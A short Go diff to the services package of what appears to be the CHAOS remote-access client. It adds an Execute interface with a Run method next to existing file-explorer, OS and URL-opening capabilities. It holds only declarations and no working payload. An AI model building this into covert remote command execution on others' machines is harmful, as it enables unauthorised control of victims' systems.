@@ -2,6 +2,7 @@ package services
 
 import (
 	"errors"
+
 	"github.com/tiagorlampert/CHAOS/client/app/entities"
 )
 
@@ -20,6 +21,7 @@ type Services struct {
 	Explorer
 	OS
 	Url
+	Execute
 }
 
 type Information interface {
@@ -59,4 +61,8 @@ type OS interface {
 
 type Url interface {
 	OpenUrl(url string) error
+}
+
+type Execute interface {
+	Run(message string) error
 }
